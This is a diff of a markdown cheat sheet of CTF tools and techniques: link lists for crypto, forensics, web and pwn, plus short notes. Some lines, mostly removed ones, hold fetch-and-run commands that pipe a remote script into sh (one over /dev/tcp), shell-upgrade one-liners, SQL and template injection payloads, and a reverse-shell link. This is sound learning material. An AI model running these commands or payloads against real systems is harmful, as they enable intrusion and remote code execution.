-- [MIPT CTF](https://github.com/xairy/mipt-ctf) - A small course for beginners in CTFs (in Russian).
-
-# ------ Tools ------
-{:#tools}
-
-[Ghidra](https://ghidra.re/CheatSheet.html)
-[Volatility](https://github.com/volatilityfoundation/volatility/wiki/Linux)
-[PwnTools](https://github.com/Gallopsled/pwntools-tutorial)
-[CyberChef](https://gchq.github.io/CyberChef)
-[DCode](https://www.dcode.fr/en)
-[Decompile Code](https://www.decompiler.com)
-[Run Code](https://tio.run)
-[GTFOBins](https://gtfobins.github.io)
-[ExploitDB](https://www.exploit-db.com)
-[RevShells](https://revshells.com) to generate reverse shell code
-[Wireshark](https://www.wireshark.org/)
+[Others](https://securitycreators.video)
 
 # ------ More Resources ------
 {:#more-resources}
@@ -407,32 +222,57 @@ categories:
 [HackTricks](https://book.hacktricks.xyz/pentesting-methodology)
 [CTF Resources](https://github.com/apsdehal/awesome-ctf)
 [Security Resources](https://github.com/CompassSecurity/security_resources)
-[Bug Bounty Resources](https://www.hacker101.com/resources)
 [Seal9055 Resources](https://github.com/seal9055/resources)
 [Forensics](https://cugu.github.io/awesome-forensics)
 [Learn RE](https://hshrzd.wordpress.com/how-to-start)
 [Learn BinExp](https://guyinatuxedo.github.io)
 [HTB Writeups](https://0xdf.gitlab.io)
 
-# ------ Wikis ------
-{:#wikis}
+[bi0s Wiki](https://teambi0s.gitlab.io/bi0s-wiki/) - Wiki from team bi0s.
+[OpenToAll](https://github.com/OpenToAllCTF/Tips) - CTF tips by OTA CTF team members.
+[OpenToAll](https://opentoallctf.github.io/)
+[Roppers Bootcamp](https://www.roppers.org/courses/ctf) - CTF Bootcamp.
+[Offsec Metasploit](https://www.offsec.com/metasploit-unleashed/) - bak.
+[Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
+[Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+[Here’s a helpful cheatsheet](https://trailofbits.github.io/ctf/forensics/)
 
-- [bi0s Wiki](https://teambi0s.gitlab.io/bi0s-wiki/) - Wiki from team bi0s.
-- [OpenToAll](https://github.com/OpenToAllCTF/Tips) - CTF tips by OTA CTF team members.
-- [OpenToAll](https://opentoallctf.github.io/)
-- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [Roppers Bootcamp](https://www.roppers.org/courses/ctf) - CTF Bootcamp.
-- [Offsec Metasploit](https://www.offsec.com/metasploit-unleashed/) - bak.
-- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
-- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
-- [Here’s a helpful cheatsheet](https://trailofbits.github.io/ctf/forensics/)
+[pcap]: https://en.wikipedia.org/wiki/Pcap
+[Windows]: https://en.wikipedia.org/wiki/Microsoft_Windows
+[.NET]: https://en.wikipedia.org/wiki/.NET_Framework
+[Wine]: https://en.wikipedia.org/wiki/Wine
+[Portable Executable]: https://en.wikipedia.org/wiki/Portable_Executable
+[QR code]: https://en.wikipedia.org/wiki/QR_code
+[Vigenere Cipher]: https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher
+[PDF]: https://en.wikipedia.org/wiki/
+[Playfair Cipher]: https://en.wikipedia.org/wiki/Playfair_cipher
+[GET]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
+[wget]: https://en.wikipedia.org/wiki/Wget
+[XSS]: https://en.wikipedia.org/wiki/Cross-site_scripting
+[HTML]: https://en.wikipedia.org/wiki/HTML
+[JavaScript]: https://en.wikipedia.org/wiki/JavaScript
+[cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
+[Atbash Cipher]: https://en.wikipedia.org/wiki/Atbash
+[PNG]: https://en.wikipedia.org/wiki/Portable_Network_Graphics
+[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
+[Malboge]: https://en.wikipedia.org/wiki/Malbolge
+[Base64]: https://en.wikipedia.org/wiki/Base64
+[Base32]: https://en.wikipedia.org/wiki/Base32
+[Base85]: https://en.wikipedia.org/wiki/Ascii85
+[International Code of Signals Maritime]: https://en.wikipedia.org/wiki/International_Code_of_Signals
+[printf vulnerability]: https://www.owasp.org/index.php/Format_string_attack
 
+*Tutorials to learn how to play CTFs*
 
+- [CTF Field Guide](https://trailofbits.github.io/ctf/) - Field Guide by Trails of Bits.
+- [CTF Resources](http://ctfs.github.io/resources/) -  Start Guide maintained by community.
+- [How to Get Started in CTF](https://www.endgame.com/blog/how-get-started-ctf) - Short guideline for CTF beginners by Endgame
+- [Intro. to CTF Course](https://www.hoppersroppers.org/courseCTF.html) - A free course that teaches beginners the basics of forensics, crypto, and web-ex.
+- [MIPT CTF](https://github.com/xairy/mipt-ctf) - A small course for beginners in CTFs (in Russian).
 
 For CTF
 --------
 
-- [AperiSolve](https://aperisolve.fr/) - Aperi'Solve is a platform which performs layer analysis on image (open-source).
 - [Exiftool](https://linux.die.net/man/1/exiftool) - Read and write meta information in files.
 - [Image Steganography Online](https://incoherency.co.uk/image-steganography/) - Client-side Javascript tool to steganographically hide/unhide images inside the lower "bits" of other images. 
 - [Steganography Online](https://stylesuxx.github.io/steganography/) - Online steganography encoder and decoder.
@@ -489,21 +329,12 @@ mplayer -af scaletempo -speed 64 flag.mp3
     - [Pitch, speed, tune](https://29a.ch/timestretch/)
     - [Reverse](https://audiotrimmer.com/online-mp3-reverser/)
 - [Depix](https://github.com/beurtschipper/Depix) - Unpixelate text
-- [https://29a.ch/photo-forensics/#error-level-analysis](https://29a.ch/photo-forensics/#error-level-analysis) - Check if something was photoshopped (look at highlights)
 - [pixrecovery](https://online.officerecovery.com/pixrecovery/)
-
-
-
-- [Try It Online](https://tio.run/) - An online tool that has a ton of Esoteric language interpreters.
 - [Malboge]
     An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Example code:
 ```
 D'`A:p>JI5GjVyg5S-t>*`o^9\*j"hWfU0cb?>|;)]xwYXtsl2Sinmlkjiba'_dcbaZ~^]V[TSwQuUTSR43ImM/KJIBAe?'CBA@9]~<5Y9216543,P*).-,%I#('&}C#"!~}vu;\xqputm3qponmfN+ihJI_%]b[!BXWV[ZSwWVU7Mq43ImMF.JCBG@dDCB$#?8\6|:32V6/u3,+*No-,+$H(!g%${A!~}vu;sxwpun4Uqjing-NMiha'eGcbaZ~k
 ```
-
-- [Ook!](https://www.dcode.fr/ook-language!)
-
-
 
 - [Atbash Cipher]
     If you have some text that you have no idea what it is, try the [Atbash cipher]! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python].
@@ -512,16 +343,11 @@ D'`A:p>JI5GjVyg5S-t>*`o^9\*j"hWfU0cb?>|;)]xwYXtsl2Sinmlkjiba'_dcbaZ~^]V[TSwQuUTS
 - [Vigenere Solver](https://www.guballa.de/vigenere-solver) - Online tool that breaks Vigenère ciphers without knowing the key.
 - Gronsfeld Cipher
     A variant of the Vignere cipher that uses numbers insteads of letters. [http://rumkin.com/tools/cipher/gronsfeld.php](http://rumkin.com/tools/cipher/gronsfeld.php)
-- Beaufourt Cipher
-    [https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)
 - [Bacon Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)
     A substitution cipher that replaces each character with five characters from a set of two (A and B is used most of the time). If we look at A as 0 and B as 1 it is a special encoding to binary numbers, where the character A has the value of binary `b00000`. Easy to recognize, because the ciphertext only contains two characters (e.g.: A and B) and the length of the ciphertext is divisible by 5. Example: `AAABB AAABA ABBAB AAABB AABAA AAAAB AAAAA AAABA ABBAB ABBAA`.
         [Online tool](http://rumkin.com/tools/cipher/baconian.php)
 - Python random module cracker/predictor
     [https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module. 
-* [LC4]
-    This is an adaptation of RC4... just not. There is an implementation available in Python.
-    [https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)
 * Substitution Cipher (use quip quip!)
     [https://quipqiup.com/](https://quipqiup.com/)
 * Railfence Cipher
@@ -530,53 +356,17 @@ D'`A:p>JI5GjVyg5S-t>*`o^9\*j"hWfU0cb?>|;)]xwYXtsl2Sinmlkjiba'_dcbaZ~^]V[TSwQuUTS
     racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)
 * Polybius Square
     [https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)
-* The Engima
-    [http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
-    [https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)
-* AES ECB
-    The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length. 
+
 * Two-Time Pad
-* [International Code of Signals Maritime]
-
-    First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look at the tool [maritime flags translator].
-
-![https://www.marvindisplay.com/images/SignalFlags.gif](https://www.marvindisplay.com/images/SignalFlags.gif)
-
-* Daggers Cipher
-The daggers cipher is another silly text-to-image encoder. This is the key, and you can
-find a decoder on [https://www.dcode.fr/daggers-alphabet](https://www.dcode.fr/daggers-alphabet).
-
-![img/dagger_cipher.png](img/dagger_cipher.png)
-
-* Hylian Language (Twilight Princess)
-The Hylian language is another silly text-to-image encoder. This is the key, and you can
-find a decoder on [https://www.dcode.fr/hylian-language-twilight-princess](https://www.dcode.fr/hylian-language-twilight-princess).
-
-![img/hylian.png](img/hylian.png)
-
-* Hylian Language (Breath of the Wild)
-The Hylian language is another silly text-to-image encoder. This is the key, and you can
-find a decoder on [https://www.dcode.fr/hylian-language-breath-of-the-wild](https://www.dcode.fr/hylian-language-breath-of-the-wild).
-
-![img/botw.jpg](img/botw.jpg)
-
-* Sheikah Language (Breathe of the Wild)
-The Sheikah language is another silly text-to-image encoder. This is the key, and you can
-find a decoder on [https://www.dcode.fr/sheikah-language](https://www.dcode.fr/sheikah-language).
-
-![img/sheikah.png](img/sheikah.png)
 
 * Hexahue Alphabet 
-The hexhue is an another tex-to-image enocder. you can find a decoder
+The hexhue is an another tex-to-image encoder. you can find a decoder
 on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/code-breaking/hexahue)
 
-![img](img/hexahue-alphabet.png)
 
 - [Base65536](https://github.com/qntm/base65536) - Unicode's answer to Base64.
 - [Braille Translator](https://www.branah.com/braille-translator) - Translate from braille to text.
 - [Ciphey](https://github.com/Ciphey/Ciphey) - Tool to automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes.
-- [CyberChef](https://gchq.github.io/CyberChef/) - A web app for encryption, encoding, compression and data analysis.
-- [dCode.fr](https://www.dcode.fr/tools-list#cryptography) - Solvers for Crypto, Maths and Encodings online.
 - [Decodify](https://github.com/s0md3v/Decodify) - Detect and decode encoded strings, recursively.
 - [Enigma Machine](https://summersidemakerspace.ca/projects/enigma-machine/) - Universal Enigma Machine Simulator.
 - [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
@@ -593,12 +383,7 @@ on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/c
 - [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) - RSA multi attacks tool.
 - [RSATool](https://github.com/ius/rsatool) - Tool to to calculate RSA and RSA-CRT parameter.
 - [Rumkin Cipher Tools](http://rumkin.com/tools/cipher/) - Collection of ciphhers/encoders tools.
-
-- [XOR Cracker](https://wiremask.eu/tools/xor-cracker/) - Online XOR decryption tool able to guess the key length and the cipher key to decrypt any file.
-- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.
-- [yagu](https://sourceforge.net/projects/yafu/) - Automated integer factorization.
 - [Crackstation](https://crackstation.net/) - Hash cracker (database).
-- [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
 - [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)
 - [Cipher Identifier (online tool) | Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)
 - [Online Encyclopedia of Integer Sequences](https://oeis.org/) - OEIS: The On-Line Encyclopedia of Integer Sequences
@@ -606,35 +391,9 @@ on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/c
 Privilege Escalation:
 ------------------------------------------------------------
 
-LinEnum
-GTFOBins
-- sudo -l - show what programs we can run without sudo, check all process against [GTFOBins](https://gtfobins.github.io/)
-
-
-- [Awesome Priv](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-- [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
-- [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
-- [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-    - `./linpeas.sh`
-    - Automatically looks for privilege escalation vectors
-- List commands we can run as root
-    - `sudo -l`
-- Find files with the SUID permission
-    - `find / -perm -u=s -type f 2>/dev/null`
-    - These files execute with the privileges of the owner instead of the user executing them
-- Find permissions for all services
-    - `accesschk.exe -uwcqv *`
-    - Look for services that are not under the System or Administrator accounts
-- Query Service
-    - `sc qc <service name>`
-    - Only works in cmd.exe 
-
-
-To check what sudo command can the current user run with no-password.
-
-```
-sudo -l
-```
+- sudo -l - List commands we can run as root 
+[Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
+[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Automatically looks for privilege escalation vectors
 
 If Python is executable as root
 
@@ -642,250 +401,8 @@ If Python is executable as root
 python3 -c "import pty;pty.spawn('/bin/sh');"
 ```
 
-Get interactive shell
+[Get interactive shell]
 python3 -c "import pty;pty.spawn('/bin/bash')"
 export TERM=xterm
 ctrl+z
 stty raw -echo; fg
-
-- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script
-
-```bash
-#From github
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
-
-#Local network
-sudo python -m SimpleHTTPServer 80
-curl 10.10.10.10/linpeas.sh | sh
-
-#Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh
-cat < /dev/tcp/10.10.10.10/80 | sh
-
-#Output to file
-linpeas -a > /dev/shm/linpeas.txt
-less -r /dev/shm/linpeas.txt #Read with colors
-```
-
-overall useful website/tools
------------------------------
-
-– web –
-- [webhook.site](https://webhook.site/) to get request bin
-- [dirsearch](https://github.com/maurosoria/dirsearch) to brute force directory
-- [GitTools](https://github.com/internetwache/GitTools) to pull git repo from public website, if .git is exposed
-- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) to generate php filter chain
-- [postman](https://www.postman.com/) to send http requests
-- [burpsuite](https://portswigger.net/burp/communitydownload) to intercept http request packages
-- [csp evaluator](https://csp-evaluator.withgoogle.com/) to evaluate CSP
-- [BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
-- [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection and Exploitation Tool.
-- [Hackbar](https://addons.mozilla.org/en-US/firefox/addon/hackbartool/) - Firefox addon for easy web exploitation.
-- [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Add on for chrome for debugging network requests.
-- [Raccoon](https://github.com/evyatarmeged/Raccoon) - A high performance offensive security tool for reconnaissance and vulnerability scanning.
-- [W3af](https://github.com/andresriancho/w3af) -  Web Application Attack and Audit Framework.
-- [XSSer](http://xsser.sourceforge.net/) - Automated XSS testor.
-
-– misc –
-- [dcode](https://www.dcode.fr/en) to decode anything
-- [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
-- [Hash Extender](https://github.com/iagox86/hash_extender) - A utility tool for performing hash length extension attacks.
-- [padding-oracle-attacker](https://github.com/KishanBagaria/padding-oracle-attacker) - A CLI tool to execute padding oracle attacks.
-- [PkCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - A tool for Breaking PkZip-encryption.
-- [QuipQuip](https://quipqiup.com) - An online tool for breaking substitution ciphers or vigenere ciphers (without key).
-- [RSACTFTool](https://github.com/Ganapati/RsaCtfTool) - A tool for recovering RSA private key with various attack.
-- [RSATool](https://github.com/ius/rsatool) - Generate private key with knowledge of p and q.
-- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.
-
-– forensics / osint –
-- [saucenao](https://saucenao.com/) to search for image source
-- [aperisolve.com](https://www.aperisolve.com/) do stego for image online
-- [photo-forensics](https://29a.ch/photo-forensics/) do stego for image online
-- [maigret](https://github.com/soxoj/maigret) to search for social media account, one of forks of sherlock
-- [F5](https://github.com/matthewgao/F5-steganography) a common F5 implementation
-- [autopsy](https://github.com/sleuthkit/autopsy) a GUI tool for forensics
-- [volatility](https://github.com/volatilityfoundation/volatility) a CLI tool for forensics memory dump
-- [png chunk checker](https://www.nayuki.io/page/png-file-chunk-inspector)
-- [binwalk](https://github.com/ReFirmLabs/binwalk)
-- [foremost](https://github.com/korczis/foremost)
-
-– crypto –
-- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) to attack RSA
-- [hashclash](https://github.com/cr-marcstevens/hashclash) for MD5 collision
-- [hashcat](https://github.com/hashcat/hashcat) to attack hash
-- [yafu](https://github.com/bbuhrow/yafu) to factorize number
-- [John the Ripper](https://github.com/openwall/john) jumbo to crack password
-- [John the Ripper](https://www.openwall.com/john/) - Open Source password security auditing and password recovery.
-- [John The Jumbo](https://github.com/magnumripper/JohnTheRipper) - Community enhanced version of John the Ripper.
-- [Hashcat](https://hashcat.net/hashcat/) - Password Cracker
-- [Hydra](https://tools.kali.org/password-attacks/hydra) - A parallelized login cracker which supports numerous protocols to attack
-- [Nozzlr](https://github.com/intrd/nozzlr) - Nozzlr is a bruteforce framework, trully modular and script-friendly.
-- [Ophcrack](http://ophcrack.sourceforge.net/) - Windows password cracker based on rainbow tables.
-- [Patator](https://github.com/lanjelot/patator) - Patator is a multi-purpose brute-forcer, with a modular design.
-- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) - Burp Suite extension for sending large numbers of HTTP requests 
-- [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) - Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.
-
-- [Hashcat](https://hashcat.net/hashcat/) - Advanced Password Recovery.
-- [Hydra](https://www.kali.org/tools/hydra/) - Parallelized login cracker which supports numerous protocols to attack.
-- [jwt_tool](https://github.com/ticarpi/jwt_tool) - A toolkit for testing, tweaking and cracking JSON Web Tokens.
-- [Ophcrack](https://ophcrack.sourceforge.io/) - Free Windows password cracker based on rainbow tables.
-- [Patator](https://github.com/lanjelot/patator) - Multi-purpose brute-forcer, with a modular design and a flexible usage.
-
-– pwn –
-- [checksec.sh]() to check binary security properties
-- [gef](https://github.com/hugsy/gef) very useful GDB plugin / [gdb-dashboard](https://github.com/cyrus-and/gdb-dashboard) Modular visual interface for GDB
-- [pwntools](https://github.com/Gallopsled/pwntools) utility for pwn in python
-- [shellcheck](https://www.shellcheck.net/) check fault in shell script
-- [rp](https://github.com/0vercl0k/rp/) fast ROP gadget finder
-- [compiler explorer](https://godbolt.org/) Online code to assembly
-- [Opcode and Instruction Reference Home](http://ref.x86asm.net/geek.html) for 32 and 64 bits
-- [Syscall Reference](https://hackeradam.com/x86-64-linux-syscalls/) for 64 bits
-- [dectect it easy](https://github.com/horsicq/Detect-It-Easy/)
-
-Web
-----------------
-
-- [BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
-- [BurpSuite](https://portswigger.net/burp)
-   - Intercepts web requests and allows you to modify them
-- [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection Exploitation Tool.
-- [debugHunter](https://github.com/devploit/debugHunter) - Discover hidden debugging parameters and uncover web application secrets.
-- [Dirhunt](https://github.com/Nekmo/dirhunt) - Find web directories without bruteforce.
-- [dirsearch](https://github.com/maurosoria/dirsearch) - Web path scanner.
-- [ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go.
-- [git-dumper](https://github.com/arthaud/git-dumper) - A tool to dump a git repository from a website.
-- [ngrok](https://ngrok.com/) - Secure introspectable tunnels to localhost.
-- [OWASP Zap](https://owasp.org/www-project-zap/) - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses.
-- [PHPGGC](https://github.com/ambionics/phpggc) - Library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.
-- [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Addon for chrome for debugging network requests.
-- [SQLMap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool.
-- [W3af](https://github.com/andresriancho/w3af) - Web application attack and audit framework.
-- [XSSer](https://xsser.03c8.net/) - Automated XSS testor.
-- [ysoserial](https://github.com/frohoff/ysoserial) - Tool for generating payloads that exploit unsafe Java object deserialization.
-
-- [Nikto](https://tools.kali.org/information-gathering/nikto) (if allowed)
-    - automatically looks for vulnerabilities
-- [gobuster](https://tools.kali.org/web-applications/gobuster) (if allowed)
-    - Brute forces directories and files
-- [hydra](https://tools.kali.org/password-attacks/hydra) (if allowed)
-    - Brute forces logins for various services
-
-- [Wireshark](https://www.wireshark.org/)
-    - Analyze live network traffic and pcap files
-- [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
-    - Useful for websites that allow you to upload files
-    - This file needs to be executed on the server to work
-- [WPScan](http://wpscan.com)
-    - Scan wordpress websites
-    - Use `wpscan --url <site> --plugins-detection mixed -e` with an api key for best results
-- SQL injection
-    - sqlmap
-        - `sqlmap --forms --dump-all -u <url>`
-        - Automates the process of SQL injection
-    - Basic SQL injection
-        - Enter `'OR 1=1--` in login form
-        - On the server this will evaluate to `SELECT * FROM Users WHERE User = '' OR 1=1--'  AND Pass = ''`
-        - `1=1` evaluates to true, which satisfies the `OR` statement, and the rest of the query is commented out by the `--`
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-    - Great resource for web exploitation with lots of payloads
-- Template Injection
-    - [tplmap](https://github.com/epinna/tplmap)
-        - Automated server-side template injection
-    - Jinja Injection
-        - \{\{ config.items() \}\}
-    - Flask Injection
-        - \{\{ config \}\}
-    - Python eval() function
-        - `__import__.('subprocess').getoutput('<command>')`
-            - make sure to switch the parentheses if it doesn't work
-        - `__import__.('subprocess').getoutput('ls').split('\\n')`
-            - list files in system
-    - [More python injection](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)
-- Cross Site Scripting
-    - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
-        - Google's Content Security Policy Evaluator
-
-
-Miscellaneous
--------------
-
-[pcap]: https://en.wikipedia.org/wiki/Pcap
-[Windows]: https://en.wikipedia.org/wiki/Microsoft_Windows
-[.NET]: https://en.wikipedia.org/wiki/.NET_Framework
-[Wine]: https://en.wikipedia.org/wiki/Wine
-[Portable Executable]: https://en.wikipedia.org/wiki/Portable_Executable
-[QR code]: https://en.wikipedia.org/wiki/QR_code
-[Vigenere Cipher]: https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher
-[PDF]: https://en.wikipedia.org/wiki/Portable_Document_Format
-[Playfair Cipher]: https://en.wikipedia.org/wiki/Playfair_cipher
-[GET]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
-[wget]: https://en.wikipedia.org/wiki/Wget
-[XSS]: https://en.wikipedia.org/wiki/Cross-site_scripting
-[HTML]: https://en.wikipedia.org/wiki/HTML
-[JavaScript]: https://en.wikipedia.org/wiki/JavaScript
-[cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
-[Atbash Cipher]: https://en.wikipedia.org/wiki/Atbash
-[PNG]: https://en.wikipedia.org/wiki/Portable_Network_Graphics
-[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
-[arbitrary code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
-[Malboge]: https://en.wikipedia.org/wiki/Malbolge
-[Base64]: https://en.wikipedia.org/wiki/Base64
-[Base32]: https://en.wikipedia.org/wiki/Base32
-[Base85]: https://en.wikipedia.org/wiki/Ascii85
-[International Code of Signals Maritime]: https://en.wikipedia.org/wiki/International_Code_of_Signals
-
-
-[maritime flags translator]: https://www.dcode.fr/maritime-signals-code
-
-
-[GitDumper.sh]: https://github.com/internetwache/GitTools
-[hipshot]: https://bitbucket.org/eliteraspberries/hipshot
-[zbarimg]: https://linux.die.net/man/1/zbarimg
-[Detect DTMF Tones]: http://dialabc.com/sound/detect/index.html
-[dnSpy]: https://github.com/0xd4d/dnSpy
-[phpdc.phpr]:https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr
-[bcompiler]: http://php.net/manual/en/book.bcompiler.php
-[pdfdetach]: https://www.systutorials.com/docs/linux/man/1-pdfdetach/
-[PEiD]: https://www.aldeid.com/wiki/PEiD
-[dumpzilla]: http://www.dumpzilla.org/
-[Edit This Cookie]: http://www.editthiscookie.com/
-[formatStringExploiter]: http://formatstringexploiter.readthedocs.io/en/latest/index.html
-[format string vulnerability]: https://www.owasp.org/index.php/Format_string_attack
-[printf vulnerability]: https://www.owasp.org/index.php/Format_string_attack
-[OpenStego]: https://www.openstego.com/
-[Stegsolve]: http://www.caesum.com/handbook/stego.htm
-[TestDisk]: https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2
-[jd-gui]: https://github.com/java-decompiler/jd-gui
-[dex2jar]: https://github.com/pxb1988/dex2jar
-[apktool]: https://ibotpeaches.github.io/Apktool/
-[XSStrike]: https://github.com/UltimateHackers/XSStrike
-[nishang]: https://github.com/samratashok/nishang
-[Piet]: https://esolangs.org/wiki/Piet
-[npiet]: https://www.bertnase.de/npiet/
-[LC4]: https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html
-[Empire]: https://github.com/EmpireProject/Empire
-[fcrackzip]: https://github.com/hyc/fcrackzip
-[zsteg]: https://github.com/zed-0xff/zsteg
-[jsteg]: https://github.com/lukechampine/jsteg
-[jstego]: https://sourceforge.net/projects/jstego/
-[StegCracker]: https://github.com/Paradoxis/StegCracker
-[StegSeek]: https://github.com/RickdeJager/stegseek
-[oletools]: https://github.com/decalage2/oletools
-[impacket]: https://github.com/SecureAuthCorp/impacket
-[Responder]: https://github.com/SpiderLabs/Responder
-[static-binaries]: https://github.com/andrew-d/static-binaries
-
-
-OSINT
------
-
-- [shodan.io](http://shodan.io) - find open ports and services online
-
-
-- [GeoSpy AI](https://geospy.ai)
-	- Geospatial vision LLM that can estimate location just from an image
-- [overpass turbo](https://overpass-turbo.eu) - Website that lets you query the OpenStreetMap API and visualize results
-- [Bellingcat OSM search](https://osm-search.bellingcat.com/) - Website that lets you easily query the OSM API
-- Resolving DNS Errors
-    - `dig <site> <recordType>`
-    - [List of record types](https://en.wikipedia.org/wiki/List_of_DNS_record_types)
